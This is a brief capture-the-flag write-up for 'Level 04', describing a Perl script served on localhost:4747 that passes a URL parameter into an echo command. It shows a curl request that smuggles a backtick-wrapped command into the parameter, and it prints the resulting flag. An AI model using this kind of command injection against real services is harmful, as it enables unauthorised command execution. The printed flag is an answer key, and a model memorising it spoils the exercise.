# Level 04

A perl script file can be found in the user directory. We can check the service is running with `netstat -tulpn`. 

We see in the source code that  the script contains a subroutine that takes as parameter `x`. It puts it in a `echo` command. Because the file has the flag04 owner, we can exploit this.

```bash
curl localhost:4747?x=lol # lol
url localhost:4747?x=\`getflag\` # ne2searoevaevoem4ov4ar8ap
```

